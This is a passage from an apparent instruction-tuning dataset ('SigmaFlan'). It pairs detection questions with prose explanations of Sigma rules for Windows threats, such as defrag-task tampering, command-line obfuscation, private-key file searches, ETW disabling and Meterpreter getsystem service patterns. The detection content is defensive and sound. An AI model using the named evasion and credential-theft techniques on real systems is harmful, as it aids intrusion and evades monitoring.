    "output": "In order to detect the deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group, you should: Monitor Windows process creation logs for occurrences where the process is `schtasks.exe`, which is indicative of task scheduling operations. Specifically, focus on command lines that include attempts to either delete (`/delete`) or change (`/change`) scheduled tasks, with a mandatory condition that these commands also specifically target the `\\Microsoft\\Windows\\Defrag\\ScheduledDefrag` task by using `/TN` (which specifies the task name). This detection points to the malicious tampering with scheduled defragmentation, a behavior observed in attacks attributed to the Slingshot APT group. Note that while this behavior is suspicious, there can be unknown legitimate reasons (false positives) for these operations, so it's classified with a medium level of severity.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group",
      "answer": "In order to detect the deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group, you should: Monitor Windows process creation logs for occurrences where the process is `schtasks.exe`, which is indicative of task scheduling operations. Specifically, focus on command lines that include attempts to either delete (`/delete`) or change (`/change`) scheduled tasks, with a mandatory condition that these commands also specifically target the `\\Microsoft\\Windows\\Defrag\\ScheduledDefrag` task by using `/TN` (which specifies the task name). This detection points to the malicious tampering with scheduled defragmentation, a behavior observed in attacks attributed to the Slingshot APT group. Note that while this behavior is suspicious, there can be unknown legitimate reasons (false positives) for these operations, so it's classified with a medium level of severity."
    }
  },
  {
    "instruction": "How can I detect: possible payload obfuscation via the commandline",
    "context": "",
    "output": "In order to detect possible payload obfuscation via the commandline, you should monitor the creation of processes on Windows systems for command lines that contain specific patterns of characters. These patterns are indicators of an attempt to obfuscate the actual commands being executed. Look out for command lines including doubled characters such as '^^', character sequences like '^|^', multiple semicolons in a row like ';;;;' or ',;,' and variations thereof. Additionally, watch out for attempts to hide or obfuscate references to command processor variables (e.g., '%COMSPEC:~') and manipulations of the command 'cmd' with inserted carets (e.g., 'c^m^d', '^c^m^d'). The presence of characters like 's^et ' in commands should also raise suspicion, as this could indicate an effort to set variables in a way that evades straightforward detection. Given the obfuscation attempts might not always originate from malicious activities, it's advised to investigate these occurrences to determine their nature and intent, acknowledging that false positives are possible but unspecified in this context.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "possible payload obfuscation via the commandline",
      "answer": "In order to detect possible payload obfuscation via the commandline, you should monitor the creation of processes on Windows systems for command lines that contain specific patterns of characters. These patterns are indicators of an attempt to obfuscate the actual commands being executed. Look out for command lines including doubled characters such as '^^', character sequences like '^|^', multiple semicolons in a row like ';;;;' or ',;,' and variations thereof. Additionally, watch out for attempts to hide or obfuscate references to command processor variables (e.g., '%COMSPEC:~') and manipulations of the command 'cmd' with inserted carets (e.g., 'c^m^d', '^c^m^d'). The presence of characters like 's^et ' in commands should also raise suspicion, as this could indicate an effort to set variables in a way that evades straightforward detection. Given the obfuscation attempts might not always originate from malicious activities, it's advised to investigate these occurrences to determine their nature and intent, acknowledging that false positives are possible but unspecified in this context."
    }
  },
  {
    "instruction": "Explain how should I detect the following: execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via winrm.vbs and copied cscript.exe (can be renamed)",
    "context": "",
    "output": "In order to detect execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via winrm.vbs and copied cscript.exe (can be renamed), you should monitor file events on Windows systems specifically focusing on files ending with 'WsmPty.xsl' or 'WsmTxt.xsl'. Importantly, these detections become relevant when these files are not located in the system's default folders, specifically 'C:\\Windows\\System32\\' or 'C:\\Windows\\SysWOW64\\'. This approach helps to identify scenarios where attackers might attempt to execute malicious scripts outside standard system directories to evade detection. Given the specificity of this method, false positives are considered unlikely. The overall security level for this detection mechanism is rated as medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via winrm.vbs and copied cscript.exe (can be renamed)",
      "answer": "In order to detect execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via winrm.vbs and copied cscript.exe (can be renamed), you should monitor file events on Windows systems specifically focusing on files ending with 'WsmPty.xsl' or 'WsmTxt.xsl'. Importantly, these detections become relevant when these files are not located in the system's default folders, specifically 'C:\\Windows\\System32\\' or 'C:\\Windows\\SysWOW64\\'. This approach helps to identify scenarios where attackers might attempt to execute malicious scripts outside standard system directories to evade detection. Given the specificity of this method, false positives are considered unlikely. The overall security level for this detection mechanism is rated as medium."
    }
  },
  {
    "instruction": "Please help me detect the following: an Antivirus alert in a highly relevant file path or with a relevant file name",
    "context": "",
    "output": "Sure!\nIn order to detect an Antivirus alert in a highly relevant file path or with a relevant file name, you should focus on monitoring antivirus logs for alerts that flag file activities within specific areas of the file system and with certain types of files that are commonly associated with malicious activity. Pay attention to files located in or containing paths such as C:\\Windows\\, C:\\Temp\\, C:\\PerfLogs\\, C:\\Users\\Public\\, and C:\\Users\\Default\\, as well as paths that include directories typically used by web applications like \\Client\\, \\tsclient\\, \\inetpub\\, /www/, and those used by web servers such as apache, tomcat, nginx, and weblogic.\n\nAdditionally, be vigilant about files with extensions that are commonly used for scripts and executables involved in cyber attacks, including but not limited to .asax, .ashx, .asmx, .asp, .aspx, .bat, .cfm, .cgi, .chm, .cmd, .dat, .ear, image files (.gif, .jpeg, .jpg, .png, .svg), Java server files (.jsp, .jspx), script files (.php, .pl, .ps1, .psm1, .py, .pyc, .rb), and web-related files (.html, .htm, .lnk, .scf, .sct, .sh, .txt, .vbe, .vbs, .war, .wsf, .wsh, .xml). \n\nThese paths and file types have been identified as significant because they are often leveraged by attackers for malicious purposes, including but not limited to deploying malware, executing remote scripts, and infiltrating web servers. The rule prioritizes a high level of alert for such detections considering the unlikelihood of false positives. Monitoring for these criteria provides a focused approach to identifying and responding to potential threats efficiently.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "an Antivirus alert in a highly relevant file path or with a relevant file name",
      "answer": "In order to detect an Antivirus alert in a highly relevant file path or with a relevant file name, you should focus on monitoring antivirus logs for alerts that flag file activities within specific areas of the file system and with certain types of files that are commonly associated with malicious activity. Pay attention to files located in or containing paths such as C:\\Windows\\, C:\\Temp\\, C:\\PerfLogs\\, C:\\Users\\Public\\, and C:\\Users\\Default\\, as well as paths that include directories typically used by web applications like \\Client\\, \\tsclient\\, \\inetpub\\, /www/, and those used by web servers such as apache, tomcat, nginx, and weblogic.\n\nAdditionally, be vigilant about files with extensions that are commonly used for scripts and executables involved in cyber attacks, including but not limited to .asax, .ashx, .asmx, .asp, .aspx, .bat, .cfm, .cgi, .chm, .cmd, .dat, .ear, image files (.gif, .jpeg, .jpg, .png, .svg), Java server files (.jsp, .jspx), script files (.php, .pl, .ps1, .psm1, .py, .pyc, .rb), and web-related files (.html, .htm, .lnk, .scf, .sct, .sh, .txt, .vbe, .vbs, .war, .wsf, .wsh, .xml). \n\nThese paths and file types have been identified as significant because they are often leveraged by attackers for malicious purposes, including but not limited to deploying malware, executing remote scripts, and infiltrating web servers. The rule prioritizes a high level of alert for such detections considering the unlikelihood of false positives. Monitoring for these criteria provides a focused approach to identifying and responding to potential threats efficiently."
    }
  },
  {
    "instruction": "Can you explain how to detect: Adversaries may search for private key certificate files on compromised systems for insecurely stored credential",
    "context": "",
    "output": "Certainly!\n\nIn order to detect adversaries searching for private key certificate files on compromised systems due to insecurely stored credentials, you should observe the creation of processes on Windows systems, focusing particularly on those initiating from command-line interfaces such as Command Prompt (cmd.exe) and PowerShell (powershell.exe or pwsh.exe), along with the usage of the findstr.exe utility. Detecting command lines that contain indicators of a search operation, such as 'dir ' in Command Prompt or 'Get-ChildItem ' in PowerShell, along with the presence of extensions related to key files (e.g., .key, .pgp, .gpg, .ppk, .p12, .pem, .pfx, .cer, .p7b, .asc), can signal potential unauthorized activities linked to the exploitation tactics of Credential Access. The rule targets the command-line arguments and executed binaries indicative of attempts to locate and potentially exfiltrate sensitive cryptographic materials which are crucial for secure communications and data protection. Monitoring for these events at a medium alert level could point toward an adversary's attempt to exploit insecurely stored credentials, thus aiding in the timely identification and mitigation of such threats.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Adversaries may search for private key certificate files on compromised systems for insecurely stored credential",
      "answer": "In order to detect adversaries searching for private key certificate files on compromised systems due to insecurely stored credentials, you should observe the creation of processes on Windows systems, focusing particularly on those initiating from command-line interfaces such as Command Prompt (cmd.exe) and PowerShell (powershell.exe or pwsh.exe), along with the usage of the findstr.exe utility. Detecting command lines that contain indicators of a search operation, such as 'dir ' in Command Prompt or 'Get-ChildItem ' in PowerShell, along with the presence of extensions related to key files (e.g., .key, .pgp, .gpg, .ppk, .p12, .pem, .pfx, .cer, .p7b, .asc), can signal potential unauthorized activities linked to the exploitation tactics of Credential Access. The rule targets the command-line arguments and executed binaries indicative of attempts to locate and potentially exfiltrate sensitive cryptographic materials which are crucial for secure communications and data protection. Monitoring for these events at a medium alert level could point toward an adversary's attempt to exploit insecurely stored credentials, thus aiding in the timely identification and mitigation of such threats."
    }
  },
  {
    "instruction": "How can I detect: Potential adversaries stopping ETW providers recording loaded .NET assemblies.",
    "context": "",
    "output": "In order to detect potential adversaries stopping ETW providers from recording loaded .NET assemblies, you should monitor specific events on Windows security logs. Look for events with the ID 4657, which indicate a change in registry values. Pay particular attention to changes within the ObjectName path of '\\SOFTWARE\\Microsoft\\.NETFramework' where the ObjectValueName 'ETWEnabled' is set to a NewValue of 0. This action indicates that Event Tracing for Windows (ETW) has been disabled for .NET Framework, which could prevent the recording of loaded .NET assemblies.\n\nAdditionally, monitor changes in the registry under any path that contains '\\Environment'. In this area, watch for modifications to either the 'COMPlus_ETWEnabled' or 'COMPlus_ETWFlags' values, specifically where their NewValue is set to 0. Such changes are indicative of attempts to disable ETW for .NET applications, which is a common tactic used by adversaries to evade detection.\n\nThese monitoring strategies are crucial for identifying activities associated with tactics and techniques like Defense Evasion. While it's acknowledged that there might be unknown false positives, the significance of these events is high, warranting close scrutiny due to their potential impact on security and incident response processes.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Potential adversaries stopping ETW providers recording loaded .NET assemblies.",
      "answer": "In order to detect potential adversaries stopping ETW providers from recording loaded .NET assemblies, you should monitor specific events on Windows security logs. Look for events with the ID 4657, which indicate a change in registry values. Pay particular attention to changes within the ObjectName path of '\\SOFTWARE\\Microsoft\\.NETFramework' where the ObjectValueName 'ETWEnabled' is set to a NewValue of 0. This action indicates that Event Tracing for Windows (ETW) has been disabled for .NET Framework, which could prevent the recording of loaded .NET assemblies.\n\nAdditionally, monitor changes in the registry under any path that contains '\\Environment'. In this area, watch for modifications to either the 'COMPlus_ETWEnabled' or 'COMPlus_ETWFlags' values, specifically where their NewValue is set to 0. Such changes are indicative of attempts to disable ETW for .NET applications, which is a common tactic used by adversaries to evade detection.\n\nThese monitoring strategies are crucial for identifying activities associated with tactics and techniques like Defense Evasion. While it's acknowledged that there might be unknown false positives, the significance of these events is high, warranting close scrutiny due to their potential impact on security and incident response processes."
    }
  },
  {
    "instruction": "Explain how should I detect the following: dropping of dll files in system32 that may be used to retrieve user credentials from LSASS",
    "context": "",
    "output": "In order to detect the dropping of dll files in system32 that may be used to retrieve user credentials from LSASS, you should: Focus on monitoring process creation events in Windows environments. Particularly, you need to keep an eye out for command line activities that exhibit specific patterns indicative of such malicious intent. The patterns to watch include the presence of 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa', 'scecli\\0*', and 'reg add' all together in the command line. This indicates an attempt to manipulate registry keys associated with the Local Security Authority Subsystem Service (LSASS), potentially for deploying or modifying Dynamic Link Libraries (DLLs) in a manner that primes them for credential theft. It's crucial to note, however, that as of the guidance provided, there are unknown scenarios that might lead to false positives. Thus, any detection at a medium level of confidence should prompt further investigation rather than immediate remediation action.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "dropping of dll files in system32 that may be used to retrieve user credentials from LSASS",
      "answer": "In order to detect the dropping of dll files in system32 that may be used to retrieve user credentials from LSASS, you should: Focus on monitoring process creation events in Windows environments. Particularly, you need to keep an eye out for command line activities that exhibit specific patterns indicative of such malicious intent. The patterns to watch include the presence of 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa', 'scecli\\0*', and 'reg add' all together in the command line. This indicates an attempt to manipulate registry keys associated with the Local Security Authority Subsystem Service (LSASS), potentially for deploying or modifying Dynamic Link Libraries (DLLs) in a manner that primes them for credential theft. It's crucial to note, however, that as of the guidance provided, there are unknown scenarios that might lead to false positives. Thus, any detection at a medium level of confidence should prompt further investigation rather than immediate remediation action."
    }
  },
  {
    "instruction": "Can you explain how to detect: browsers starting with the remote debugging flags. Which is a technique often used to perform browser injection attacks",
    "context": "",
    "output": "Certainly!\n\nIn order to detect browsers starting with the remote debugging flags, which is a technique often used to perform browser injection attacks, you should:\n\nMonitor the process creation logs on Windows operating systems for specific command line parameters that indicate a browser (such as Chromium-based browsers or Firefox) is being started with remote debugging enabled. Look for Chromium-based browsers being launched with any command line argument that includes '--remote-debugging-', which covers flags related to remote debugging addresses, ports, socket names, and debugging pipes among others. Additionally, for Firefox, pay attention to processes where the image path ends with '\\firefox.exe' and the command line includes '-start-debugger-server'. Detection relies on identifying at least one of these conditions being true. Be aware of potential unknown false positives, and assess the detected activities with a medium level of scrutiny.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "browsers starting with the remote debugging flags. Which is a technique often used to perform browser injection attacks",
      "answer": "In order to detect browsers starting with the remote debugging flags, which is a technique often used to perform browser injection attacks, you should:\n\nMonitor the process creation logs on Windows operating systems for specific command line parameters that indicate a browser (such as Chromium-based browsers or Firefox) is being started with remote debugging enabled. Look for Chromium-based browsers being launched with any command line argument that includes '--remote-debugging-', which covers flags related to remote debugging addresses, ports, socket names, and debugging pipes among others. Additionally, for Firefox, pay attention to processes where the image path ends with '\\firefox.exe' and the command line includes '-start-debugger-server'. Detection relies on identifying at least one of these conditions being true. Be aware of potential unknown false positives, and assess the detected activities with a medium level of scrutiny."
    }
  },
  {
    "instruction": "Please help me detect the following: usage of the \"Import-Module\" cmdlet to load the \"Microsoft.ActiveDirectory.Management.dl\" DLL. Which is often used by attackers to perform AD enumeration.",
    "context": "",
    "output": "Sure!\nIn order to detect usage of the \"Import-Module\" cmdlet to load the \"Microsoft.ActiveDirectory.Management.dll\" DLL, which is often used by attackers to perform AD enumeration, you should monitor for specific characteristics in process creation logs within Windows environments. Observations should focus on executions of PowerShell (powershell.exe or pwsh.exe) or instances where PowerShell\u2019s executable file name (PowerShell.EXE) or its associated dynamic link library (pwsh.dll) appears. Further scrutiny is required for any command line activity that includes the usage of 'Import-Module' or its alias 'ipmo', specifically when it is used to load the 'Microsoft.ActiveDirectory.Management.dll'. This behavior flags potential attempts at Active Directory enumeration, a common tactic in cyber attacks to gather information about the network's users, groups, and services.\n\nAttention should be paid to legitimate administrative activities that might use similar methods for benign purposes. Such instances are considered potential false positives. Detection efforts aimed at identifying this activity are set at a medium level of urgency, indicating a balanced approach to monitoring and response, ensuring that regular administrative tasks are not hindered while still maintaining vigilance against potential threats. The tags associated with this behavior include Tactic: Credential Access, and Technique: Unsecured Credentials, specifically relating to the misuse of PowerShell for executing commands that involve loading suspicious modules, indicative of reconnaissance activities or preparation for further attack stages.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the \"Import-Module\" cmdlet to load the \"Microsoft.ActiveDirectory.Management.dl\" DLL. Which is often used by attackers to perform AD enumeration.",
      "answer": "In order to detect usage of the \"Import-Module\" cmdlet to load the \"Microsoft.ActiveDirectory.Management.dll\" DLL, which is often used by attackers to perform AD enumeration, you should monitor for specific characteristics in process creation logs within Windows environments. Observations should focus on executions of PowerShell (powershell.exe or pwsh.exe) or instances where PowerShell\u2019s executable file name (PowerShell.EXE) or its associated dynamic link library (pwsh.dll) appears. Further scrutiny is required for any command line activity that includes the usage of 'Import-Module' or its alias 'ipmo', specifically when it is used to load the 'Microsoft.ActiveDirectory.Management.dll'. This behavior flags potential attempts at Active Directory enumeration, a common tactic in cyber attacks to gather information about the network's users, groups, and services.\n\nAttention should be paid to legitimate administrative activities that might use similar methods for benign purposes. Such instances are considered potential false positives. Detection efforts aimed at identifying this activity are set at a medium level of urgency, indicating a balanced approach to monitoring and response, ensuring that regular administrative tasks are not hindered while still maintaining vigilance against potential threats. The tags associated with this behavior include Tactic: Credential Access, and Technique: Unsecured Credentials, specifically relating to the misuse of PowerShell for executing commands that involve loading suspicious modules, indicative of reconnaissance activities or preparation for further attack stages."
    }
  },
  {
    "instruction": "How can I detect: usage of the Get-ADComputer cmdlet to collect computer information and output it to a file",
    "context": "",
    "output": "In order to detect usage of the Get-ADComputer cmdlet to collect computer information and output it to a file, you should: monitor the creation of process events on Windows systems, specifically looking for instances where PowerShell (`powershell.exe` or its newer version `pwsh.exe`) is executed. Pay close attention to the command lines used during the execution, especially focusing on commands containing \u2018Get-ADComputer \u2018 coupled with the `-Filter *`, indicating a broad search filter being applied. This indicates an attempt to retrieve computer-related information from Active Directory.\n\nAdditionally, scrutiny should be applied when these PowerShell commands aim to redirect their output to a file or manipulate it further for inspection or exfiltration. This can be identified through specific command-line patterns such as usage of characters and strings like `>`, `| Select `, `Out-File`, `Set-Content`, and `Add-Content`, which are commonly employed for output redirection or content manipulation in files.\n\nIt\u2019s important to account for potential false positives, as legitimate administrative scripts may also use these commands and patterns for routine tasks. To refine detection efficacy, exclusions can be applied for trusted computers or users known to execute these commands as part of their normal operation.\n\nThis detection strategy is grounded on identifying the utilization of PowerShells\u2019 inherent capabilities to interact with the Windows environment and Active Directory, an approach often leveraged in reconnaissance and information gathering phases of an attack. By focusing on these specific command-line arguments and PowerShell executables, defensive measures can be tuned to catch suspicious activities indicative of an initial assessment or footprinting attempt by an adversary without overly disrupting legitimate administrative work.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the Get-ADComputer cmdlet to collect computer information and output it to a file",
      "answer": "In order to detect usage of the Get-ADComputer cmdlet to collect computer information and output it to a file, you should: monitor the creation of process events on Windows systems, specifically looking for instances where PowerShell (`powershell.exe` or its newer version `pwsh.exe`) is executed. Pay close attention to the command lines used during the execution, especially focusing on commands containing \u2018Get-ADComputer \u2018 coupled with the `-Filter *`, indicating a broad search filter being applied. This indicates an attempt to retrieve computer-related information from Active Directory.\n\nAdditionally, scrutiny should be applied when these PowerShell commands aim to redirect their output to a file or manipulate it further for inspection or exfiltration. This can be identified through specific command-line patterns such as usage of characters and strings like `>`, `| Select `, `Out-File`, `Set-Content`, and `Add-Content`, which are commonly employed for output redirection or content manipulation in files.\n\nIt\u2019s important to account for potential false positives, as legitimate administrative scripts may also use these commands and patterns for routine tasks. To refine detection efficacy, exclusions can be applied for trusted computers or users known to execute these commands as part of their normal operation.\n\nThis detection strategy is grounded on identifying the utilization of PowerShells\u2019 inherent capabilities to interact with the Windows environment and Active Directory, an approach often leveraged in reconnaissance and information gathering phases of an attack. By focusing on these specific command-line arguments and PowerShell executables, defensive measures can be tuned to catch suspicious activities indicative of an initial assessment or footprinting attempt by an adversary without overly disrupting legitimate administrative work."
    }
  },
  {
    "instruction": "How can I detect: parameters used by WMImplant",
    "context": "",
    "output": "In order to detect parameters used by WMImplant, you should monitor Windows PowerShell scripts for specific signs that suggest the presence of malicious activity typical of WMImplant usage. This involves analyzing script block texts for certain keywords that indicate actions WMImplant might perform. The required environment to catch such activities includes having Script Block Logging enabled on the Windows system. The key indicators for detecting potential WMImplant activity encompass a range of operations, from user account modifications (like changing a user account with 'change_user') and command executions ('command_exec') to more specific system manipulations such as disabling or enabling Windows Remote Management ('disable_winrm', 'enable_winrm') and Digest Authentication ('disable_wdigest', 'enable_wdigest'). It also involves looking for evidence of registry modifications ('registry_mod'), remote PowerShell sessions ('remote_posh'), scheduled tasks creation ('sched_job'), service modifications ('service_mod'), process termination ('process_kill'), tracking active users ('active_users'), gathering basic system information ('basic_info'), system shutdown ('power_off'), identifying systems with no active users ('vacant_system'), and examining logon events ('logon_events'). It's important to be aware that legitimate administrative scripts might also use some of these keywords, resulting in potential false positives. Due to the serious implications of detecting such activity, this monitoring is considered to be of high importance.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "parameters used by WMImplant",
      "answer": "In order to detect parameters used by WMImplant, you should monitor Windows PowerShell scripts for specific signs that suggest the presence of malicious activity typical of WMImplant usage. This involves analyzing script block texts for certain keywords that indicate actions WMImplant might perform. The required environment to catch such activities includes having Script Block Logging enabled on the Windows system. The key indicators for detecting potential WMImplant activity encompass a range of operations, from user account modifications (like changing a user account with 'change_user') and command executions ('command_exec') to more specific system manipulations such as disabling or enabling Windows Remote Management ('disable_winrm', 'enable_winrm') and Digest Authentication ('disable_wdigest', 'enable_wdigest'). It also involves looking for evidence of registry modifications ('registry_mod'), remote PowerShell sessions ('remote_posh'), scheduled tasks creation ('sched_job'), service modifications ('service_mod'), process termination ('process_kill'), tracking active users ('active_users'), gathering basic system information ('basic_info'), system shutdown ('power_off'), identifying systems with no active users ('vacant_system'), and examining logon events ('logon_events'). It's important to be aware that legitimate administrative scripts might also use some of these keywords, resulting in potential false positives. Due to the serious implications of detecting such activity, this monitoring is considered to be of high importance."
    }
  },
  {
    "instruction": "Please help me detect the following: execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.",
    "context": "",
    "output": "Sure!\nIn order to detect the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint, you should focus on monitoring process creation events in Windows systems. Look for particular indicators such as the execution of processes remotely, the use of tools like Sysinternals PsExec, or processes with descriptions starting with \"Windows PowerShell\" or \"pwsh\". Also, pay attention to processes with specific original file names including but not limited to 'powershell.exe', 'pwsh.dll', 'powershell_ise.exe', 'psexec.exe', 'psexec.c', and various others known to be used in malicious activities.\n\nIt's critical to filter out false positives by excluding processes with images ending in common legitimate names such as '\\powershell.exe', '\\pwsh.exe', among others. This is important as attackers might rename binaries to slightly altered names that are hard to distinguish from the originals at a quick glance. Be aware of potential false positives like custom applications using renamed binaries with slight changes to the binary name, or the use of PsExec installed via the Windows Store, which doesn't contain the original filename field leading to possible false negatives.\n\nThis detection strategy is grounded in tactics and techniques akin to Credential Access, Execution, Defense Evasion, and Discovery, with a high importance level assigned due to the criticality of identifying and reacting to such malicious activities promptly.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.",
      "answer": "In order to detect the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint, you should focus on monitoring process creation events in Windows systems. Look for particular indicators such as the execution of processes remotely, the use of tools like Sysinternals PsExec, or processes with descriptions starting with \"Windows PowerShell\" or \"pwsh\". Also, pay attention to processes with specific original file names including but not limited to 'powershell.exe', 'pwsh.dll', 'powershell_ise.exe', 'psexec.exe', 'psexec.c', and various others known to be used in malicious activities.\n\nIt's critical to filter out false positives by excluding processes with images ending in common legitimate names such as '\\powershell.exe', '\\pwsh.exe', among others. This is important as attackers might rename binaries to slightly altered names that are hard to distinguish from the originals at a quick glance. Be aware of potential false positives like custom applications using renamed binaries with slight changes to the binary name, or the use of PsExec installed via the Windows Store, which doesn't contain the original filename field leading to possible false negatives.\n\nThis detection strategy is grounded in tactics and techniques akin to Credential Access, Execution, Defense Evasion, and Discovery, with a high importance level assigned due to the criticality of identifying and reacting to such malicious activities promptly."
    }
  },
  {
    "instruction": "How can I detect: when an attacker create a similar folder structure to windows system folders such as (Windows, Program Files...)\nbut with a space in order to trick DLL load search order and perform a \"DLL Search Order Hijacking\" attack\n",
    "context": "",
    "output": "In order to detect when an attacker creates a similar folder structure to Windows system folders such as (Windows, Program Files...) but with a space in order to trick DLL load search order and perform a \"DLL Search Order Hijacking\" attack, you should monitor file events on Windows systems, specifically focusing on the creation of .dll files that begin with paths closely resembling 'C:\\Windows \\', 'C:\\Program Files \\', or 'C:\\Program Files (x86) \\' but with an additional space. This approach aims to identify attempts to exploit the DLL search order hijacking technique by placing malicious DLLs in directories that might be searched before the legitimate ones. It's critical to pay high attention to such activities due to their high threat level, although it's acknowledged that determining false positives can be challenging in this context.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "when an attacker create a similar folder structure to windows system folders such as (Windows, Program Files...)\nbut with a space in order to trick DLL load search order and perform a \"DLL Search Order Hijacking\" attack\n",
      "answer": "In order to detect when an attacker creates a similar folder structure to Windows system folders such as (Windows, Program Files...) but with a space in order to trick DLL load search order and perform a \"DLL Search Order Hijacking\" attack, you should monitor file events on Windows systems, specifically focusing on the creation of .dll files that begin with paths closely resembling 'C:\\Windows \\', 'C:\\Program Files \\', or 'C:\\Program Files (x86) \\' but with an additional space. This approach aims to identify attempts to exploit the DLL search order hijacking technique by placing malicious DLLs in directories that might be searched before the legitimate ones. It's critical to pay high attention to such activities due to their high threat level, although it's acknowledged that determining false positives can be challenging in this context."
    }
  },
  {
    "instruction": "How can I detect: DNS query initiated from a \"wscript\" process for domains matching a specific pattern that was seen being used by SocGholish for its Command and Control traffic",
    "context": "",
    "output": "In order to detect a DNS query initiated from a \"wscript\" process for domains matching a specific pattern that was seen being used by SocGholish for its Command and Control traffic, you should monitor DNS query logs from Windows systems. Look for any DNS queries that originate from a process ending with `\\wscript.exe`. The focus should be on detecting domain names in these queries that fit a particular pattern, specifically, domain names consisting of hexadecimal characters ranging from 4 to 8 characters long followed by at least two domain parts (e.g., abcdef01.example.com). These characteristics are indicative of domain names that might be used by the SocGholish malware for Command and Control (C2) communication. It's important to be aware of potential false positives, which can arise from legitimate domain names that accidentally match the regex pattern, such as those belonging to domain controllers or legitimate services. This detection is critical, as it pertains to high-level security threats involving SocGholish's C2 activities, and involves deeply analyzing DNS query patterns for suspicious behavior indicative of malware communication.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "DNS query initiated from a \"wscript\" process for domains matching a specific pattern that was seen being used by SocGholish for its Command and Control traffic",
      "answer": "In order to detect a DNS query initiated from a \"wscript\" process for domains matching a specific pattern that was seen being used by SocGholish for its Command and Control traffic, you should monitor DNS query logs from Windows systems. Look for any DNS queries that originate from a process ending with `\\wscript.exe`. The focus should be on detecting domain names in these queries that fit a particular pattern, specifically, domain names consisting of hexadecimal characters ranging from 4 to 8 characters long followed by at least two domain parts (e.g., abcdef01.example.com). These characteristics are indicative of domain names that might be used by the SocGholish malware for Command and Control (C2) communication. It's important to be aware of potential false positives, which can arise from legitimate domain names that accidentally match the regex pattern, such as those belonging to domain controllers or legitimate services. This detection is critical, as it pertains to high-level security threats involving SocGholish's C2 activities, and involves deeply analyzing DNS query patterns for suspicious behavior indicative of malware communication."
    }
  },
  {
    "instruction": "How to detect: Detect filter driver unloading activity via fltmc.exe",
    "context": "",
    "output": "In order to detect filter driver unloading activity via fltmc.exe, you should: monitor for process creation events in Windows that indicate the execution of 'fltMC.exe' or when the original file name is exactly 'fltMC.exe'. Specifically, look for cases where the command line includes the term 'unload'. However, make an exception and do not trigger an alert for a command line that ends with 'unload rtp_filesystem_filter', as this is recognized as a legitimate process related to Avira antivirus installations. This approach focuses primarily on identifying potentially malicious activity associated with the unloading of filter drivers, which could signify an attacker's efforts to disable security functions or evade detection. It's important to treat these detections with a high level of suspicion due to the rare nature of legitimate use cases for unloading filter drivers.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detect filter driver unloading activity via fltmc.exe",
      "answer": "In order to detect filter driver unloading activity via fltmc.exe, you should: monitor for process creation events in Windows that indicate the execution of 'fltMC.exe' or when the original file name is exactly 'fltMC.exe'. Specifically, look for cases where the command line includes the term 'unload'. However, make an exception and do not trigger an alert for a command line that ends with 'unload rtp_filesystem_filter', as this is recognized as a legitimate process related to Avira antivirus installations. This approach focuses primarily on identifying potentially malicious activity associated with the unloading of filter drivers, which could signify an attacker's efforts to disable security functions or evade detection. It's important to treat these detections with a high level of suspicion due to the rare nature of legitimate use cases for unloading filter drivers."
    }
  },
  {
    "instruction": "Please help me detect the following: use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation",
    "context": "",
    "output": "Sure!\nIn order to detect the use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation, you should: Monitor Windows driver load logs for instances where command execution patterns match those often used by attackers to escalate privileges or gain system access. Specifically, look out for the loading of services where the image path includes executions via 'cmd', '%COMSPEC%', or 'cmd.exe' followed by '/c', 'echo', and targeted at 'pipe' directories, indicative of Meterpreter and Cobalt Strike activities. Another technique involves observing 'rundll32' executions that load DLL files with a particular focus on patterns that include '.dll,a' and '/p:', which are characteristic of a method to execute malicious code within a seemingly benign process. The log entries to scrutinize should contain the computer name, the domain name, and the username under which the activity was initiated, along with the precise image path used in the operation. Given the critical nature of this detection and its tie to advanced persistent threat tactics, false positives are considered highly unlikely.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of getsystem Meterpreter/Cobalt Strike command by detecting a specific service installation",
